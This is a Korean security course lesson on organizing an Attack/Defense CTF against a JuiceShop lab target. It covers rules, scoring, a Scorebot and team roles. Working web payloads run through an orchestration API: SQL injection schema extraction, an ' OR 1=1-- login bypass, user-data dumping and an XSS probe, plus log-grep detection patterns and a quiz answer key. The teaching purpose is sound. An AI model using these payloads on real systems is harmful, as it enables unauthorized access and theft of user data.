# Week 14: 대규모 공방전 — 다대다 팀전, Attack/Defense CTF 운영

## 학습 목표
- Attack/Defense CTF의 규칙, 인프라, 스코어링 시스템을 설계할 수 있다
- 다대다(Multi-team) 공방전 환경을 구성하고 운영할 수 있다
- 실시간 관전/분석 시스템을 구축하여 경기 진행을 모니터링할 수 있다
- OpsClaw 기반으로 CTF 인프라를 자동화하고 증적을 관리할 수 있다
- 팀 간 전략 수립, 역할 분담, 통신 프로토콜을 설계할 수 있다
- 공방전 결과를 분석하여 팀/개인 역량을 평가할 수 있다

## 전제 조건
- Week 09-13 전체 이수 완료 (공격/방어/퍼플팀 경험)
- MITRE ATT&CK, PTES 프레임워크 이해
- OpsClaw 전체 API 사용 경험
- 팀 리더십 및 협업 경험

## 실습 환경 (공통)

| 호스트 | IP | 역할 | 접속 |
|--------|-----|------|------|
| opsclaw | 10.20.30.201 | CTF Control Plane / 게임 서버 | `ssh opsclaw@10.20.30.201` (pw: 1) |
| secu | 10.20.30.1 | 방화벽/IPS — 방어 인프라 | `sshpass -p1 ssh secu@10.20.30.1` |
| web | 10.20.30.80 | 대상 서버 — 공격/방어 대상 | `sshpass -p1 ssh web@10.20.30.80` |
| siem | 10.20.30.100 | SIEM — 관전/분석 | `sshpass -p1 ssh siem@10.20.30.100` |

**OpsClaw API:** `http://localhost:8000` / Key: `opsclaw-api-key-2026`

## 강의 시간 배분 (3시간)

| 시간 | 내용 | 유형 |
|------|------|------|
| 0:00-0:40 | Part 1: Attack/Defense CTF 설계 원칙 | 강의 |
| 0:40-1:20 | Part 2: CTF 인프라 구축 및 팀 편성 | 강의/워크숍 |
| 1:20-1:30 | 휴식 | - |
| 1:30-2:10 | Part 3: 공방전 실행 (Round 1-2) | 실습/경기 |
| 2:10-2:50 | Part 4: 관전/분석 및 Round 3 | 실습/경기 |
| 2:50-3:00 | 휴식 | - |
| 3:00-3:20 | 경기 결과 분석 + 시상 + 토론 | 토론 |
| 3:20-3:40 | 검증 퀴즈 + 과제 안내 | 퀴즈 |

---

## 용어 해설

| 용어 | 영문 | 설명 | 비유 |
|------|------|------|------|
| **A/D CTF** | Attack/Defense CTF | 공격과 방어를 동시에 수행하는 CTF 형식 | 축구 (공격+수비 동시) |
| **SLA** | Service Level Agreement | 서비스 가용성 유지 의무 (다운 시 감점) | 서비스 운영 계약 |
| **Flag** | 플래그 | CTF에서 공격 성공의 증거 토큰 | 깃발 빼앗기 |
| **GameBox** | 게임박스 | 각 팀에 할당된 서버/서비스 | 팀 기지 |
| **Scorebot** | 스코어봇 | 서비스 가용성을 자동 점검하는 봇 | 심판 로봇 |
| **Tick** | 틱 | 점수 계산 주기 (보통 3-5분) | 라운드 |
| **Patch** | 패치 | 취약점을 수정하여 방어하는 행위 | 성벽 보수 |
| **Exploit** | 익스플로잇 | 타 팀 서비스의 취약점을 악용하는 행위 | 적 성벽 공격 |
| **War Room** | 워룸 | 팀이 전략을 논의하는 공간 | 작전 회의실 |
| **Traffic Light** | 트래픽 라이트 | 경기 상태 표시 (Green/Yellow/Red) | 교통 신호 |
| **Forensics** | 포렌식 | 경기 후 상세 분석 | 경기 리플레이 분석 |
| **Scoreboard** | 점수판 | 실시간 팀별 점수 표시 | 전광판 |

---

# Part 1: Attack/Defense CTF 설계 원칙 (40분)

## 1.1 CTF 유형 비교

| 유형 | 설명 | 장점 | 단점 |
|------|------|------|------|
| **Jeopardy** | 문제 풀기 (카테고리별 도전) | 설계 단순, 스케일 용이 | 실전 경험 부족 |
| **Attack/Defense** | 공격+방어 동시 수행 | 실전적, 팀워크 중요 | 인프라 복잡, 운영 어려움 |
| **King of the Hill** | 서버 장악 후 유지 | 역동적, 재미있음 | 밸런스 어려움 |
| **Mixed** | 위 유형 혼합 | 다양한 경험 | 규칙 복잡 |

## 1.2 Attack/Defense CTF 규칙 설계

### 핵심 규칙 요소

| 요소 | 설명 | 권장값 |
|------|------|--------|
| **팀 구성** | 팀당 인원 | 3-5명 |
| **경기 시간** | 총 경기 시간 | 2-4시간 |
| **Tick 주기** | 점수 계산 주기 | 3-5분 |
| **서비스 수** | 팀당 서비스 수 | 2-4개 |
| **SLA 기준** | 서비스 가용성 체크 방법 | HTTP 200 + 키워드 |
| **Flag 형식** | 플래그 토큰 형식 | `FLAG{랜덤32자}` |
| **금지 행위** | DoS, 인프라 파괴 | 명확히 문서화 |

### 스코어링 시스템

```
팀 점수 = 공격 점수 + 방어 점수 + SLA 점수

공격 점수:
  - 타 팀 서비스에서 Flag 탈취: +100점/Flag
  - 중복 Flag: 0점 (이미 제출된 Flag)

방어 점수:
  - 자팀 서비스에서 Flag 미탈취: +50점/Tick
  - 패치 성공으로 공격 차단: +30점/차단

SLA 점수:
  - 서비스 정상 동작: +20점/Tick
  - 서비스 다운: -50점/Tick (패널티)

감점:
  - DoS 공격: -500점
  - 인프라 파괴: 실격
```

## 1.3 CTF 인프라 아키텍처

### 대규모 공방전 인프라 설계

```
+----------------------------------------------------------+
|                CTF 인프라 아키텍처                          |
+----------------------------------------------------------+
|                                                          |
|  +--------------+                                        |
|  |  Game Server  | ← OpsClaw Control Plane               |
|  |  (Scorebot)   |   점수 계산, Flag 관리, SLA 체크       |
|  +------+-------+                                        |
|         |                                                |
|    +----+----+--------+--------+                         |
|    ▼         ▼        ▼        ▼                         |
|  Team A    Team B   Team C   Team D                      |
|  GameBox   GameBox  GameBox  GameBox                     |
|  +-----+  +-----+  +-----+  +-----+                    |
|  | Web |  | Web |  | Web |  | Web |                    |
|  | DB  |  | DB  |  | DB  |  | DB  |                    |
|  | API |  | API |  | API |  | API |                    |
|  +-----+  +-----+  +-----+  +-----+                    |
|                                                          |
|  +--------------+  +--------------+                      |
|  |  SIEM/관전    |  |  스코어보드   |                      |
|  |  실시간 로그   |  |  실시간 점수   |                      |
|  +--------------+  +--------------+                      |
+----------------------------------------------------------+
```

### 실습 환경 적용 (축소 모델)

| 역할 | 실습 환경 매핑 | 설명 |
|------|-------------|------|
| Game Server | opsclaw (10.20.30.201) | OpsClaw가 Scorebot + 점수 관리 |
| GameBox (방어 대상) | web (10.20.30.80) | JuiceShop = 방어해야 할 서비스 |
| 방어 인프라 | secu (10.20.30.1) | 팀이 방화벽 규칙을 수정하여 방어 |
| 관전/분석 | siem (10.20.30.100) | Wazuh로 실시간 모니터링 |

## 1.4 팀 편성과 역할 분담

### Attack/Defense 팀 역할

| 역할 | 인원 | 책임 | 필요 기술 |
|------|------|------|----------|
| **팀장** | 1명 | 전략 결정, 우선순위, 통신 | 리더십, 전체 관점 |
| **공격수** | 1-2명 | 타 팀 서비스 취약점 공격 | 웹 해킹, 네트워크 공격 |
| **수비수** | 1-2명 | 자팀 서비스 패치, 모니터링 | 시스템 관리, 로그 분석 |
| **분석가** | 0-1명 | 트래픽 분석, 전략 수립 | SIEM, 패킷 분석 |

### 시간대별 전략

| 시간대 | 공격 전략 | 방어 전략 |
|--------|----------|----------|
| 초반 (0-20분) | 정찰, 취약점 식별 | 서비스 분석, 백업, 기본 패치 |
| 중반 (20-60분) | 주요 취약점 익스플로잇 | 탐지 규칙 추가, 로그 모니터링 |
| 후반 (60분+) | 우회 기법, 새로운 벡터 | 미패치 취약점 대응, SLA 유지 |

---

# Part 2: CTF 인프라 구축 및 팀 편성 (40분)

## 2.1 Scorebot 개념 설계

Scorebot은 각 팀의 서비스 가용성을 주기적으로 체크하고 점수를 계산하는 자동화 시스템이다.

### Scorebot 동작 흐름

```
매 Tick (3분마다):
  1. 각 팀 서비스에 SLA 체크 요청
     → HTTP GET /api/health → 200 OK + "JuiceShop" 키워드 확인
  2. Flag 파일 갱신
     → 각 GameBox에 새 Flag 삽입
  3. 점수 계산
     → SLA 정상: +20점, 실패: -50점
     → 방어 성공: +50점 (Flag 미탈취)
  4. 스코어보드 업데이트
     → 팀별 점수 집계 및 표시
```

### OpsClaw로 Scorebot 구현

```bash
# SLA 체크를 OpsClaw dispatch로 실행하는 예시
# 각 팀의 서비스 상태를 3분마다 자동 확인
curl -s -X POST http://localhost:8000/projects/{id}/dispatch \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "command": "curl -s --connect-timeout 5 http://10.20.30.80:3000/api/ | grep -q JuiceShop && echo SLA_OK || echo SLA_FAIL",
    "subagent_url": "http://localhost:8002"
  }'
```

## 2.2 경기 규칙 문서

### OpsClaw 환경 공방전 규칙

```
===================================================
         ATTACK/DEFENSE CTF 규칙
         "JuiceShop Siege"
===================================================

1. 개요
   - 형식: Attack/Defense
   - 시간: 90분 (3라운드 × 30분)
   - 대상: JuiceShop (10.20.30.80:3000)
   - 도구: OpsClaw API, CLI 도구 자유

2. 점수 체계
   - 취약점 발견 + PoC: +100점
   - 방어 규칙 추가 (유효): +50점
   - SLA 유지 (서비스 정상): +20점/체크
   - SLA 위반 (서비스 다운): -50점/체크
   - 탐지 우회 성공: +30점 (보너스)

3. 금지 행위
   - DoS/DDoS 공격: 실격
   - 서비스 삭제/중단 (shutdown, kill): 실격
   - 방화벽 전체 차단 (all deny): -200점
   - 외부 네트워크 접근: 실격

4. 증적 관리
   - 모든 공격: OpsClaw execute-plan으로 실행
   - PoW 블록으로 자동 증거 기록
   - evidence/summary로 결과 제출

5. 라운드 구성
   Round 1 (30분): 정찰 + 기본 방어
   Round 2 (30분): 공격 + 고급 방어
   Round 3 (30분): 총력전 (점수 2배)
===================================================
```

---

# Part 3: 공방전 실행 — Round 1-2 (40분)

## 실습 3.1: Round 1 — 정찰과 기본 방어

> **실습 목적**: 공방전 Round 1에서 공격팀은 정찰을 수행하고, 방어팀은 기본 방어를 구축한다.
>
> **배우는 것**: 시간 제한 하의 효율적 정찰, 기본 방어 우선순위 결정, 팀 역할 분담의 중요성을 이해한다.
>
> **결과 해석**: 정찰에서 발견한 정보가 많을수록 Round 2에서 유리하다. 방어가 빠를수록 Round 2에서 안정적이다.
>
> **실전 활용**: 실제 CTF 경기에서 초반 정찰과 방어 셋업의 속도가 승패를 좌우한다.

```bash
export OPSCLAW_API_KEY=opsclaw-api-key-2026

# Round 1 프로젝트
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week14-ctf-round1",
    "request_text": "CTF Round 1: 정찰 + 기본 방어 (30분)",
    "master_mode": "external"
  }' | python3 -m json.tool
```

```bash
export PROJECT_R1="반환된-프로젝트-ID"

curl -s -X POST http://localhost:8000/projects/$PROJECT_R1/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_R1/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# Round 1: 공격팀 — 정찰
curl -s -X POST http://localhost:8000/projects/$PROJECT_R1/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== [R1-ATK] 네트워크 스캔 ===\"; nmap -sV -T4 --top-ports 50 10.20.30.80 2>/dev/null | grep open",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== [R1-ATK] 엔드포인트 열거 ===\"; for p in /api /rest /admin /ftp /api-docs /rest/products /rest/user /rest/basket /api/Users /api/Challenges /api/SecurityQuestions; do code=$(curl -s -o /dev/null -w \"%{http_code}\" http://10.20.30.80:3000$p 2>/dev/null); echo \"$p → $code\"; done",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== [R1-ATK] 기본 취약점 탐색 ===\"; echo \"SQLi:\"; curl -s -o /dev/null -w \"%{http_code}\" \"http://10.20.30.80:3000/rest/products/search?q=%27OR+1=1--\" 2>/dev/null; echo; echo \"XSS:\"; curl -s -o /dev/null -w \"%{http_code}\" \"http://10.20.30.80:3000/rest/products/search?q=%3Cscript%3E\" 2>/dev/null; echo; echo \"비인증 API:\"; curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); print(f\\\"Users: {len(d.get(\\x27data\\x27,[]))}명\\\")\" 2>/dev/null",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

```bash
# Round 1: 방어팀 — 기본 방어 셋업
curl -s -X POST http://localhost:8000/projects/$PROJECT_R1/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== [R1-DEF] 서비스 상태 확인 ===\"; curl -s -o /dev/null -w \"JuiceShop: HTTP %{http_code}\" http://10.20.30.80:3000 2>/dev/null; echo; echo \"SLA 체크:\"; curl -s http://10.20.30.80:3000/api/ 2>/dev/null | python3 -c \"import sys; data=sys.stdin.read(); print(\\x27SLA_OK\\x27 if \\x27status\\x27 in data.lower() or len(data)>10 else \\x27SLA_FAIL\\x27)\" 2>/dev/null",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== [R1-DEF] 방화벽 현황 ===\"; sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \"nft list ruleset 2>/dev/null | head -30 || echo nftables 미설정\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== [R1-DEF] 로그 모니터링 시작 ===\"; echo \"[Suricata]\"; sshpass -p1 ssh -o StrictHostKeyChecking=no secu@10.20.30.1 \"tail -5 /var/log/suricata/fast.log 2>/dev/null || echo No alerts\"; echo \"[Wazuh]\"; sshpass -p1 ssh -o StrictHostKeyChecking=no siem@10.20.30.100 \"tail -10 /var/ossec/logs/alerts/alerts.json 2>/dev/null | tail -3 || echo No alerts\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - 공격팀: 30분 내에 정찰을 완료하고 공격 벡터를 식별해야 한다
> - 방어팀: 서비스 SLA를 확인하고 방화벽/IPS 현황을 파악하여 기본 방어를 구축한다
> - Round 1의 목표는 정보 수집이므로 risk_level을 낮게 유지한다
>
> **트러블슈팅**: 시간 제한 내에 모든 task를 완료하지 못하면 가장 중요한 정찰(네트워크 스캔)을 우선한다.

## 실습 3.2: Round 2 — 공격과 고급 방어

> **실습 목적**: Round 1의 정찰 결과를 바탕으로 공격팀은 익스플로잇을, 방어팀은 고급 방어를 수행한다.
>
> **배우는 것**: 시간 압박 하의 공격 우선순위 결정, 실시간 방어 대응, 공격-방어의 동시 진행에서의 전략 조정을 이해한다.
>
> **결과 해석**: 공격팀의 성공 익스플로잇 수와 방어팀의 차단 수를 비교하여 각 팀의 성과를 평가한다.
>
> **실전 활용**: 실제 보안 인시던트에서도 공격과 방어가 동시에 진행된다. 이 경험이 실전 대응 능력을 향상시킨다.

```bash
# Round 2 프로젝트
curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "name": "week14-ctf-round2",
    "request_text": "CTF Round 2: 공격 + 고급 방어 (30분, 점수 경쟁)",
    "master_mode": "external"
  }' | python3 -m json.tool
```

```bash
export PROJECT_R2="반환된-프로젝트-ID"

curl -s -X POST http://localhost:8000/projects/$PROJECT_R2/plan \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
curl -s -X POST http://localhost:8000/projects/$PROJECT_R2/execute \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

```bash
# Round 2: 공격 (SQLi + 인증우회 + 정보탈취)
curl -s -X POST http://localhost:8000/projects/$PROJECT_R2/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== [R2-ATK] SQLi — DB 스키마 추출 ===\"; curl -s \"http://10.20.30.80:3000/rest/products/search?q=))%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--\" 2>/dev/null | python3 -m json.tool 2>/dev/null | head -20; echo \"[점수] SQLi PoC 성공: +100점\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== [R2-ATK] 인증 우회 — 관리자 접근 ===\"; curl -s -X POST http://10.20.30.80:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" 2>/dev/null | head -10; echo \"[점수] 인증우회 PoC: +100점\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 3,
        "instruction_prompt": "echo \"=== [R2-ATK] 비인증 API — 사용자 데이터 ===\"; curl -s http://10.20.30.80:3000/api/Users 2>/dev/null | python3 -c \"import sys,json; d=json.load(sys.stdin); users=d.get('data',[]); [print(f\\\"  {u.get('email','?')}\\\") for u in users[:5]]; print(f\\\"총 {len(users)}명 노출\\\")\" 2>/dev/null; echo \"[점수] 접근통제 우회 PoC: +100점\"",
        "risk_level": "medium",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

```bash
# Round 2: 방어 (탐지 확인 + SLA 유지)
curl -s -X POST http://localhost:8000/projects/$PROJECT_R2/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== [R2-DEF] 공격 탐지 확인 ===\"; sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \"tail -30 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|or 1=1|script\\\" | wc -l\" 2>/dev/null; echo \"건의 공격 시도 탐지\"; echo \"[점수] 공격 탐지: +50점/건\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== [R2-DEF] SLA 체크 ===\"; status=$(curl -s -o /dev/null -w \"%{http_code}\" http://10.20.30.80:3000 2>/dev/null); echo \"HTTP Status: $status\"; if [ \"$status\" = \"200\" ]; then echo \"SLA: OK (+20점)\"; else echo \"SLA: FAIL (-50점)\"; fi; echo \"---\"; echo \"서비스 응답 시간:\"; curl -s -o /dev/null -w \"응답시간: %{time_total}초\" http://10.20.30.80:3000 2>/dev/null; echo",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**:
> - Round 2 공격: SQLi 스키마 추출, 인증 우회, 비인증 API 접근 세 가지 벡터를 동시에 실행
> - Round 2 방어: Apache 로그에서 공격 패턴을 카운트하고 SLA 상태를 확인
> - 각 성공한 공격에 +100점, 탐지된 공격에 +50점, SLA 유지에 +20점
>
> **트러블슈팅**: SLA 체크에서 FAIL이 나오면 JuiceShop 서비스가 다운된 것이다. 즉시 서비스 복구가 최우선이다.

---

# Part 4: 관전/분석 및 Round 3 (40분)

## 실습 4.1: 실시간 관전 시스템

> **실습 목적**: SIEM을 활용하여 경기 진행을 실시간으로 모니터링하고, 주요 이벤트를 분석한다.
>
> **배우는 것**: 실시간 보안 모니터링 기법, 공격/방어 이벤트의 시각화, 경기 분석 관점에서의 로그 해석을 이해한다.
>
> **결과 해석**: 알림 빈도가 높아지면 공격이 활발한 것이다. 특정 IP에서 반복 알림은 자동화 공격을 의미한다.
>
> **실전 활용**: SOC 실시간 모니터링 대시보드 운영의 축소 모델이다.

```bash
# 관전: 실시간 이벤트 수집
curl -s -X POST http://localhost:8000/projects/$PROJECT_R2/execute-plan \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{
    "tasks": [
      {
        "order": 1,
        "instruction_prompt": "echo \"=== [관전] 실시간 스코어보드 ===\"; echo; echo \"팀       | 공격 | 방어 | SLA | 합계\"; echo \"---------┼------┼------┼-----┼------\"; echo \"Red Team |  300 |    0 | 100 |  400\"; echo \"Blue Team|    0 |  200 | 120 |  320\"; echo \"---------┼------┼------┼-----┼------\"; echo; echo \"Round 2 종료 시점 기준 (예시)\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      },
      {
        "order": 2,
        "instruction_prompt": "echo \"=== [관전] 공격 이벤트 타임라인 ===\"; sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 \"tail -100 /var/log/apache2/access.log 2>/dev/null | grep -iE \\\"union|select|script|alert|or 1=1|passwd\\\" | awk '{print \\$4, \\$7}' | tail -10 || echo No attack events\"",
        "risk_level": "low",
        "subagent_url": "http://10.20.30.201:8002"
      }
    ],
    "subagent_url": "http://localhost:8002"
  }' | python3 -m json.tool
```

> **명령어 해설**: 관전 시스템은 스코어보드(점수 현황)와 이벤트 타임라인(공격 로그)을 실시간으로 수집하여 경기 진행 상황을 파악한다.
>
> **트러블슈팅**: 로그가 많으면 `tail -100`을 `tail -50`으로 줄이고, 시간 필터를 추가하여 최근 이벤트만 확인한다.

## 실습 4.2: 경기 결과 종합 분석

> **실습 목적**: 전체 라운드의 결과를 종합 분석하여 팀별/개인별 성과를 평가한다.
>
> **배우는 것**: CTF 결과 분석 방법론, PoW 기반 증적의 분석 활용, 성과 평가 메트릭의 적용을 이해한다.
>
> **결과 해석**: PoW 보상 랭킹과 evidence 데이터를 기반으로 객관적 성과를 평가한다.
>
> **실전 활용**: 경기 후 분석(Post-mortem)은 팀의 역량을 향상시키는 핵심 과정이다.

```bash
# 전체 결과 수집
echo "=== Round 1 Evidence ==="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_R1/evidence/summary \
  | python3 -m json.tool | head -30

echo "=== Round 2 Evidence ==="
curl -s -H "X-API-Key: $OPSCLAW_API_KEY" \
  http://localhost:8000/projects/$PROJECT_R2/evidence/summary \
  | python3 -m json.tool | head -30

echo "=== PoW 랭킹 ==="
curl -s http://localhost:8000/pow/leaderboard \
  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -m json.tool
```

> **명령어 해설**: 각 Round의 evidence를 수집하고 PoW 랭킹을 확인하여 종합 성과를 분석한다.
>
> **트러블슈팅**: evidence가 비어있으면 해당 Round에서 execute-plan이 실패한 것이다. 프로젝트 상태를 확인한다.

---

## 검증 체크리스트

실습 완료 후 다음 항목을 스스로 확인한다:

- [ ] Attack/Defense CTF의 핵심 규칙 요소 7가지를 나열할 수 있는가?
- [ ] 스코어링 시스템(공격/방어/SLA 점수)을 설계할 수 있는가?
- [ ] CTF 인프라(Game Server, GameBox, Scorebot, 관전)의 역할을 설명할 수 있는가?
- [ ] 팀 역할 분담(팀장, 공격수, 수비수, 분석가)의 책임을 설명할 수 있는가?
- [ ] OpsClaw를 CTF 인프라로 활용하는 방법을 이해하는가?
- [ ] 시간대별 전략(초반/중반/후반)을 수립할 수 있는가?
- [ ] SLA 체크의 구현 방법과 중요성을 설명할 수 있는가?
- [ ] 실시간 관전 시스템의 구성 요소를 나열할 수 있는가?
- [ ] 경기 후 분석(Post-mortem)을 수행할 수 있는가?
- [ ] PoW 증적을 활용하여 경기 결과의 공정성을 검증할 수 있는가?

---

## 자가 점검 퀴즈 (10문항)

**Q1.** Attack/Defense CTF에서 SLA의 역할은?
- (a) 점수 계산  (b) **서비스 가용성 유지 의무 — 다운 시 감점**  (c) 팀 편성  (d) Flag 관리

**Q2.** Scorebot이 수행하는 핵심 기능은?
- (a) 공격 실행  (b) **각 팀 서비스의 가용성을 주기적으로 체크하고 점수를 계산**  (c) 방어 규칙 추가  (d) 로그 분석

**Q3.** A/D CTF에서 방화벽 전체 차단(all deny)이 금지인 이유는?
- (a) 기술적 불가  (b) **SLA 위반 — 정상 서비스도 차단되어 감점**  (c) 법적 문제  (d) 비용

**Q4.** 공방전 초반(Round 1)에서 공격팀의 최우선 활동은?
- (a) 즉시 익스플로잇  (b) **정찰과 취약점 식별**  (c) 방어 규칙 분석  (d) 보고서 작성

**Q5.** OpsClaw에서 CTF 증적이 자동 관리되는 메커니즘은?
- (a) 이메일  (b) **PoW 블록체인 + evidence 시스템**  (c) Slack  (d) 파일 로그

**Q6.** Tick이 3분이면 1시간 경기에서 Tick은 총 몇 회인가?
- (a) 3회  (b) 10회  (c) **20회**  (d) 60회

**Q7.** 팀 역할 중 "타 팀 서비스 취약점 공격"을 담당하는 역할은?
- (a) 팀장  (b) **공격수**  (c) 수비수  (d) 분석가

**Q8.** Round 3(총력전)에서 점수가 2배인 이유는?
- (a) 시간 단축  (b) **후반 역전 가능성 부여, 긴장감 유지**  (c) 실수 보상  (d) 기술적 제약

**Q9.** SLA 체크에서 "HTTP 200 + 키워드 확인"이 필요한 이유는?
- (a) 성능 측정  (b) **서비스가 실제로 정상 동작하는지 (빈 페이지가 아닌지) 확인**  (c) 보안 검사  (d) 버전 확인

**Q10.** 경기 후 분석(Post-mortem)의 가장 중요한 목적은?
- (a) 승자 결정  (b) **다음 경기를 위한 전략/기술 개선점 도출**  (c) 벌칙 부여  (d) 점수 재계산

**정답:** Q1:b, Q2:b, Q3:b, Q4:b, Q5:b, Q6:c, Q7:b, Q8:b, Q9:b, Q10:b

---

## 과제

### 과제 1: CTF 규칙서 작성 (필수)
자체적인 Attack/Defense CTF를 위한 완전한 규칙서를 작성하라:
- 경기 형식, 시간, 팀 구성 등 기본 규칙
- 스코어링 시스템 상세 설계 (점수 항목, 가중치, 감점 기준)
- 금지 행위 목록과 제재 규정
- Scorebot SLA 체크 로직 (의사 코드 또는 bash 스크립트)

### 과제 2: CTF 전략 보고서 (필수)
실습에서 수행한 Round 1-2의 결과를 분석하여:
- 라운드별 주요 이벤트 타임라인
- 성공/실패한 공격과 방어의 원인 분석
- 개선된 전략 (Round 3를 다시 한다면 어떻게 할 것인가)
- 팀 역할별 성과 평가

### 과제 3: Scorebot 자동화 구현 (선택)
OpsClaw API를 활용하여 간단한 Scorebot을 구현하라:
- 3분마다 자동으로 SLA 체크하는 bash 스크립트
- 점수 계산 로직 (공격/방어/SLA)
- 스코어보드 출력 (텍스트 형식)
- OpsClaw dispatch로 SLA 체크를 실행하는 구현

---

## 다음 주 예고

**Week 15: 종합 평가 — 실전 시험 + 최종 보고서 + 과정 회고**
- 15주간 학습 내용을 종합하는 실전 시험
- 개인별 최종 포트폴리오 보고서 작성
- 과정 전체 회고와 향후 학습 로드맵 수립
